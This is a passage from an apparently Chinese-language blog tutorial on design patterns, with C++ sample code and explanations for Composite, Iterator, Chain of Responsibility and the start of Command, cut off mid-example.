 <br>  <span class="hljs-function">Component *<span class="hljs-title">getChild</span><span class="hljs-params">( <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> index )</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> children[ index ];<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">( Component *component )</span></span><br><span class="hljs-function">  </span>&#123;<br>    children.push_back( component );<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">remove</span><span class="hljs-params">( <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> index )</span></span><br><span class="hljs-function">  </span>&#123;<br>    Component *child = children[ index ];<br>    children.erase( children.<span class="hljs-built_in">begin</span>() + index );<br>    <span class="hljs-keyword">delete</span> child;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">operation</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; children.<span class="hljs-built_in">size</span>(); i++ )<br>    &#123;<br>      children[ i ]-&gt;operation();<br>    &#125;<br>  &#125;<br>  <br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Component*&gt; children;<br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Leaf</span><br><span class="hljs-comment"> * defines the behavior for the elements in the composition,</span><br><span class="hljs-comment"> * it has no children</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Leaf</span> :</span> <span class="hljs-keyword">public</span> Component<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  Leaf( <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> i ) : id( i ) &#123;&#125;<br>  <br>  ~Leaf() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">operation</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Leaf "</span>&lt;&lt; id &lt;&lt;<span class="hljs-string">" operation"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br><br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-keyword">int</span> id;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  Composite composite;<br>  <br>  <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++ )<br>  &#123;<br>    composite.add( <span class="hljs-keyword">new</span> Leaf( i ) );<br>  &#125;<br>  <br>  composite.<span class="hljs-built_in">remove</span>( <span class="hljs-number">0</span> );<br>  composite.operation();<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>Composite的operation()中处理到了Composite类型对象，会继续处理其children。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/25/16-48-11-b6d47f.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><p>典型的 Composite对象结构如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/25/16-49-01-61f13e.png" srcset="/img/loading.gif" lazyload style="zoom:60%;"></p><h3><span id="iterator">Iterator</span></h3><p>不管内部的数据结构如何定义，Iterator使用统一接口，隐藏内部实现，供外部使用各种数据结构。</p><p>Iterator提供一种方法顺序访问一个聚合对象中各个元素 ,而又不需暴露该对象的内部表示。</p><p>这个模式在C++中，并不是实现目的的最优选择。STL中泛型编程实现的Iterator比面向对象设计模式实现的Iterator，更高效。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/25/17-16-03-508d08.png" srcset="/img/loading.gif" lazyload style="zoom:70%;"></p><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdexcept&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Iterator</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteAggregate</span>;</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Aggregate</span><br><span class="hljs-comment"> * defines an interface for aggregates and it decouples your</span><br><span class="hljs-comment"> * client from the implementation of your collection of objects</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Aggregate</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Aggregate() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> Iterator *<span class="hljs-title">createIterator</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Aggregate</span><br><span class="hljs-comment"> * has a collection of objects and implements the method</span><br><span class="hljs-comment"> * that returns an Iterator for its collection</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteAggregate</span> :</span> <span class="hljs-keyword">public</span> Aggregate<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ConcreteAggregate( <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span> )<br>  &#123;<br>    <span class="hljs-built_in">list</span> = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-built_in">size</span>]();<br>    count = <span class="hljs-built_in">size</span>;<br>  &#125;<br>  <br>  ~ConcreteAggregate()<br>  &#123;<br>    <span class="hljs-keyword">delete</span>[] <span class="hljs-built_in">list</span>;<br>  &#125;<br>  <br>  <span class="hljs-function">Iterator *<span class="hljs-title">createIterator</span><span class="hljs-params">()</span></span>;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">size</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> count;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">at</span><span class="hljs-params">( <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> index )</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>[ index ];<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-keyword">int</span> *<span class="hljs-built_in">list</span>;<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> count;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Iterator</span><br><span class="hljs-comment"> * provides the interface that all iterators must implement and</span><br><span class="hljs-comment"> * a set of methods for traversing over elements</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Iterator</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Iterator() &#123; <span class="hljs-comment">/* ... */</span> &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">first</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">next</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">isDone</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">int</span> <span class="hljs-title">currentItem</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Iterator</span><br><span class="hljs-comment"> * implements the interface and is responsible for managing</span><br><span class="hljs-comment"> * the current position of the iterator</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteIterator</span> :</span> <span class="hljs-keyword">public</span> Iterator<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ConcreteIterator( ConcreteAggregate *l ) :<br>    <span class="hljs-built_in">list</span>( l ), index( <span class="hljs-number">0</span> ) &#123;&#125;<br>  <br>  ~ConcreteIterator() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">first</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    index = <span class="hljs-number">0</span>;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">next</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    index++;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">isDone</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> ( index &gt;= <span class="hljs-built_in">list</span>-&gt;<span class="hljs-built_in">size</span>() );<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">currentItem</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span> ( isDone() )<br>    &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">list</span>-&gt;at(index);<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  ConcreteAggregate *<span class="hljs-built_in">list</span>;<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> index;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-function">Iterator *<span class="hljs-title">ConcreteAggregate::createIterator</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ConcreteIterator( <span class="hljs-keyword">this</span> );<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span> = <span class="hljs-number">5</span>;<br>  ConcreteAggregate <span class="hljs-built_in">list</span> = ConcreteAggregate( <span class="hljs-built_in">size</span> );<br>  <br>  Iterator *it = <span class="hljs-built_in">list</span>.createIterator();<br>  <span class="hljs-keyword">for</span> ( ; !it-&gt;isDone(); it-&gt;next())<br>  &#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Item value: "</span> &lt;&lt; it-&gt;currentItem() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">delete</span> it;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>面向对象的Iterator，相比STL的Iterator，其代价在于ConcreteIterator这种子类调用虚函数的代价。</p><p>这种通过虚函数实现多态调用的方法，是运行时多态。</p><p>STL通过模板支持不同的数据结构，是编译时多态，由编译器直接推断出具体类型。显然，就程序运行时效率而言，泛型编程的方式效率会更高。</p><p>然而在一些不支持泛型编程的语言种，Iterator设计模式还是有应用的。</p><h3><span id="chain-of-responsibility">Chain of Responsibility</span></h3><p>当一个请求可以被多个对象处理，但是每次仅会有一个对象完成处理操作，此时，如果显示的一种情况一种情况地去指定处理对象，那么实现会很复杂。</p><p>Chain ofResponsibility使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系。将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止。</p><p>一个链表中所有对象，依次处理一个请求。最后没有被处理的请求，应当设置默认的响应机制。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/25/17-30-13-af35b3.png" srcset="/img/loading.gif" lazyload style="zoom:70%;"></p><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Handler</span><br><span class="hljs-comment"> * defines an interface for handling requests and</span><br><span class="hljs-comment"> * optionally implements the successor link</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handler</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Handler() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setHandler</span><span class="hljs-params">( Handler *s )</span></span><br><span class="hljs-function">  </span>&#123;<br>    successor = s;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleRequest</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span> (successor != <span class="hljs-number">0</span>)<br>    &#123;<br>      successor-&gt;handleRequest();<br>    &#125;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-comment">// 相当于链表的next指针</span><br>  Handler *successor;<br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Handlers</span><br><span class="hljs-comment"> * handle requests they are responsible for</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteHandler1</span> :</span> <span class="hljs-keyword">public</span> Handler<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteHandler1() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">canHandle</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-comment">// ...</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleRequest</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span> ( canHandle() )<br>    &#123;<br>      <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Handled by Concrete Handler 1"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Cannot be handled by Handler 1"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>      Handler::handleRequest();<br>    &#125;<br>    <span class="hljs-comment">// ...</span><br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteHandler2</span> :</span> <span class="hljs-keyword">public</span> Handler<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteHandler2() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">canHandle</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-comment">// ...</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleRequest</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span> ( canHandle() )<br>    &#123;<br>      <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Handled by Handler 2"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Cannot be handled by Handler 2"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>      Handler::handleRequest();<br>    &#125;<br>    <span class="hljs-comment">// ...</span><br>  &#125;<br>  <br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  ConcreteHandler1 handler1;<br>  ConcreteHandler2 handler2;<br>  <br>  <span class="hljs-comment">// 设置链式处理顺序</span><br>  handler1.setHandler( &amp;handler2 );<br>  handler1.handleRequest();<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="行为变化相关模式">行为变化相关模式</span></h2><p>在组件构建过程中，组件行为会发生变化，并且因此导致组件不得不重新实现。行为一般就是具体的成员方法实现。</p><p>行为变化相关模式，就是将组件的行为和组件自身进行解耦。分隔出变化的行为部分。</p><p>典型模式：</p><ol type="1"><li>Command</li><li>Visitor</li></ol><h3><span id="command">Command</span></h3><p>将行为抽象为对象，有点类似C++的函数对象。</p><p>Command模式将一个请求封装为一个对象，从而使你可用不同的请求对客户进行参数化；对请求（此时是一个可储存的对象）排队或记录请求日志，以及支持可撤消的操作。</p><p>Command模式也被称为动作( Action )或事务( Transaction )模式。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/25/18-06-54-9860e5.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Receiver</span><br><span class="hljs-comment"> * knows how to perform the operations associated</span><br><span class="hljs-comment"> * with carrying out a request</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Receiver</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">action</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Receiver: execute action"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Command</span><br><span class="hljs-comment"> * declares an interface for all commands</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Command</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Command() &#123;&#125;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">protected</span>:<br>  Command() &#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Command</span><br><span class="hljs-comment"> * implements execute by invoking the corresponding</span><br><span class="hljs-comment"> * operation(s) on Receiver</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteCommand</span> :</span> <span class="hljs-keyword">public</span> Command<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ConcreteCommand( Receiver *r ) : receiver( r ) &#123;&#125;<br>  <br>  ~ConcreteCommand()<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( receiver 